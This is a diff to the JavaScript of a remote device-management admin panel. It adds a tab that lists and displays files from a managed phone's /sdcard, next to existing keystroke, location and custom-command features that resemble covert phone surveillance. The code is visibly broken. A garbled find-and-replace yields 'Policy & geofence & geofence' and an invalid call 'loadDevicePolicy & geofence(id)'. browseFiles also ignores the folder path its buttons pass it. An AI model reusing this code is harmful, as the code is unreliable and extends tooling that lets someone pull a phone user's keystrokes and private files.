@@ -304,7 +304,7 @@ async function loadDetail(id){
       '<button class="ghost" onclick="runCmd(\''+esc(id)+'\',\'sync\')">🔄 Sync</button> '+
       '<span style="margin-left:6px"><input id="customCmd" placeholder="custom command" style="min-width:150px"> <button class="ghost" onclick="runCustom(\''+esc(id)+'\')">Send</button></span>';
     // tabs
-    el("dev0tabs").innerHTML = ['Overview','Apps','Keystrokes / activity','Location','Policy & geofence & geofence','Audit',].map((t,i)=>
+    el("dev0tabs").innerHTML = ['Overview','Apps','Files','Keystrokes / activity','Location','Policy & geofence & geofence','Audit',].map((t,i)=>
       '<button class="ghost '+(i===0?'on':'')+'" data-t="'+i+'" onclick="consoleTab(\''+esc(id)+'\',this)">'+t+'</button>').join('');
     consoleTab(id, document.querySelector('#dev0tabs button'));
   }catch(e){ el("dev0status").innerHTML = '<span class="err">'+esc(e.message)+'</span>'; }
@@ -326,10 +326,11 @@ function consoleTab(id, btn){
   const d = detailCache || {};
   if(t==="0"){ b.innerHTML = renderOverview(d); }
   else if(t==="1"){ b.innerHTML = renderApps(d); }
-  else if(t==="2"){ loadDeviceLogs(id); }
-  else if(t==="3"){ loadDeviceLocation(id); }
-  else if(t==="4"){ loadDevicePolicy & geofence(id); }
-  else { b.innerHTML = renderDeviceAudit(d); }
+  else if(t==="2"){ loadDeviceFiles(id); }
+  else if(t==="3"){ loadDeviceLogs(id); }
+  else if(t==="4"){ loadDeviceLocation(id); }
+  else if(t==="5"){ loadDevicePolicy & geofence(id); }
+  else if(t==="6"){ b.innerHTML = renderDeviceAudit(d); }
 }
 function renderOverview(d){
   let h = '<div class="row" style="gap:18px">';
@@ -370,6 +371,50 @@ function runCustom(id){
   const c = el("customCmd").value.trim(); if(!c) return alert("Enter a command name");
   api("/admin/devices/"+encodeURIComponent(id)+"/command", {method:"POST", body: JSON.stringify({cmd:c, reason:""})})
     .then(()=>{ loadDetail(id); }).catch(e=>alert(e.message));
+}
+
+async function loadDeviceFiles(id){
+  const b = el("dev0body");
+  b.innerHTML = '<div style="padding:20px;text-align:center;font-size:14px;color:#aaa">File Manager — click "Browse" to list a directory</div>';
+  // Add file manager UI
+  b.innerHTML = '<div style="padding:16px"><div style="display:flex;gap:8px;align-items:center;margin-bottom:12px"><input id="filePath" placeholder="/sdcard" value="/sdcard" style="flex:1;padding:8px 12px;border-radius:6px;border:1px solid #333;background:#16151a;color:#fff;font-size:13px"><button class="ghost on" onclick="browseFiles(\''+esc(id)+'\')" style="padding:8px 16px;border-radius:6px;font-size:13px">Browse</button></div><div id="fileList" style="border:1px solid #222;border-radius:8px;padding:12px;min-height:100px;background:#0a0b0e"></div></div>';
+}
+async function browseFiles(id){
+  const path = el("filePath").value.trim() || "/sdcard";
+  const list = el("fileList"); list.innerHTML = '<span class="dim">Requesting directory listing...</span>';
+  try{
+    await api("/admin/devices/"+encodeURIComponent(id)+"/files?path="+encodeURIComponent(path));
+    // Wait a moment for device to upload the listing
+    setTimeout(function(){ loadFileListing(id, path); }, 3000);
+  }catch(e){ list.innerHTML = '<span class="err">'+esc(e.message)+'</span>'; }
+}
+async function loadFileListing(id, path){
+  const list = el("fileList");
+  try{
+    const r = await fetch("/admin/devices/"+encodeURIComponent(id)+"/files/content?path="+encodeURIComponent(path), {headers:{"Authorization":"Bearer "+token}});
+    if(!r.ok) throw new Error("no listing yet — device may be offline");
+    const files = JSON.parse(await r.text());
+    if(!Array.isArray(files) || files.length === 0){ list.innerHTML = '<span class="dim">Directory is empty</span>'; return; }
+    // Parent directory link
+    let html = '<table style="width:100%;font-size:12px;border-collapse:collapse">';
+    const parent = path.split("/").slice(0,-1).join("/") || "/";
+    html += '<tr style="border-bottom:1px solid #222"><td><button class="ghost" style="padding:4px 8px;font-size:12px" onclick="browseFiles(\''+esc(id)+'\', \''+esc(parent)+'\')">⬆ ..</button></td><td></td><td></td></tr>';
+    files.forEach(function(f){
+      const icon = f.type === "dir" ? "📁" : "📄";
+      html += '<tr style="border-bottom:1px solid #111"><td><button class="ghost" style="padding:4px 8px;font-size:12px" onclick="'+(f.type==="dir"?"browseFiles('"+esc(id)+"','"+esc(f.path)+"')":"viewFile('"+esc(id)+"','"+esc(f.path)+"')")+'">'+icon+' '+esc(f.name)+'</button></td><td style="color:#666;padding:4px 8px">'+(f.type==="dir"?"":(f.size||0)+" B")+'</td><td style="color:#555;padding:4px 8px;font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(f.path)+'</td></tr>';
+    });
+    html += '</table>';
+    list.innerHTML = html;
+  }catch(e){ list.innerHTML = '<span class="err">Could not load: '+esc(e.message)+'</span>'; }
+}
+async function viewFile(id, path){
+  try{
+    const r = await fetch("/admin/devices/"+encodeURIComponent(id)+"/files/content?path="+encodeURIComponent(path), {headers:{"Authorization":"Bearer "+token}});
+    if(!r.ok) throw new Error("file not available");
+    const txt = await r.text();
+    const b = el("dev0body");
+    b.innerHTML = '<div style="padding:16px"><button class="ghost" onclick="browseFiles(\''+esc(id)+'\',\''+esc(path.split("/").slice(0,-1).join("/")||"/")+'\')" style="margin-bottom:8px">← Back</button><pre style="background:#0a0b0e;padding:12px;border-radius:6px;overflow:auto;max-height:400px;font-size:12px;white-space:pre-wrap;word-break:break-all">'+esc(txt)+'</pre></div>';
+  }catch(e){ alert("Could not load file: "+e.message); }
 }
 
 async function loadDeviceLogs(id){
